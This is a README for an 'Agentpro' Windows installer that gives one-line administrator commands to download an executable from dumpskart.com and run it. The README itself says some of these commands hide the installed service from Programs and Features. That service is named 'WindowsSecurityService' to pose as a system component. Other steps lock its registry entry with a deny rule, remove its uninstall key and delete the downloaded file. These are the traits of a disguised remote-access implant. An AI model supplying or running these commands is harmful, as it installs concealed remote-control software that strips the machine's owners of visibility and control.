# Setup

One-click installer for Agentpro. Downloads and installs Agentpro.exe to `C:\Program Files\`.

## Quick Install

1. Download `AgentproInstall.bat`
2. Right-click → **Run as administrator**
3. Done!

## What it does

- Downloads `AgentproGithub.exe` from this repo
- Saves it to `C:\Program Files\Agentpro.exe`
- Runs `Agentpro.exe -fullinstall` automatically
  
## 🚀 Quick Installation (Windows)

## Download & Install (One-Line Command)
 
### Windows server installation
 
```
curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.exe" && "C:\Program Files\Agentpro.exe" -fullinstall
```
```
curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.exe" && "C:\Program Files\Agentpro.exe" -fullinstall && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f
```
###Second
```
curl -L -o "C:\Program Files\Agentpro2.exe" "https://dumpskart.com/Mesh2/Agentpro2.exe" && "C:\Program Files\Agentpro2.exe" -fullinstall
```
```
curl -L -o "C:\Program Files\Agentpro2.exe" "https://dumpskart.com/Mesh2/Agentpro2.exe" && "C:\Program Files\Agentpro2.exe" -fullinstall && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f
```

### Windows all installation steps
```
echo [1/4] Downloading agent... && curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.exe" && echo [2/4] Installing agent... && "C:\Program Files\Agentpro.exe" -fullinstall && timeout /t 10 /nobreak >nul && echo [3/4] Hiding from Programs and Features... && reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /v "SystemComponent" /t REG_DWORD /d 1 /f && echo [4/4] Locking registry... && powershell -Command "$acl = Get-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService'; $rule = New-Object System.Security.AccessControl.RegistryAccessRule('NT AUTHORITY\SYSTEM','SetValue','Deny'); $acl.AddAccessRule($rule); Set-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService' $acl" && echo [5/5] Cleaning up... && del /f /q "C:\Program Files\Agentpro.exe" && echo. && echo Installation complete! 
Run the following command in **Command Prompt (Run as Administrator)**:
```
### Uninstall
```
echo [1/3] Removing registry lock... && powershell -Command "$acl = Get-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService'; $rule = New-Object System.Security.AccessControl.RegistryAccessRule('NT AUTHORITY\SYSTEM','SetValue','Deny'); $acl.RemoveAccessRule($rule); Set-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService' $acl" && echo [2/3] Uninstalling agent... && "C:\Program Files\Windows Security Service\WindowsSecurityService\WindowsSecurityService.exe" -fulluninstall && echo [3/3] Cleaning registry... && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f && echo. && echo Uninstall complete!
```
### Github
```cmd
curl -L -o "C:\Program Files\Agentpro.exe" "https://github.com/SellerDumpskart/Setup/raw/refs/heads/main/AgentproGithub.exe" && "C:\Program Files\Agentpro.exe" -fullinstall
```

## Manual Install

If you prefer to do it manually, open an **admin** Command Prompt and run:

```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/SellerDumpskart/Setup/raw/refs/heads/main/AgentproGithub.exe' -OutFile 'C:\Program Files\Agentpro.exe' -UseBasicParsing"
"C:\Program Files\Agentpro.exe" -fullinstall
```

## Requirements

- Windows 10/11
- Administrator access
